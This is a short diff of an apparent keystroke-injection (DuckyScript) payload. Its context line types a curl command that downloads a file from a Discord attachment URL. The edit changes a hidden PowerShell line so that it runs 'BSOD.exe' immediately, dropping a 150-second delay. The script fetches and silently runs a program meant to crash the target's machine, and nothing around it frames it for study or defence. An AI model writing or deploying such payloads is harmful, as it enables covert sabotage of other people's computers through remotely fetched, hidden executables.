@@ -20,6 +20,6 @@ STRING curl https://cdn.discordapp.com/attachments/1069171881275568189/107537070
 DELAY 150
 ENTER
 DELAY 150
-STRING powershell -WindowStyle Hidden -Command timeout 150; .\BSOD.exe
+STRING powershell -WindowStyle Hidden -Command .\BSOD.exe
 DELAY 150
 ENTER
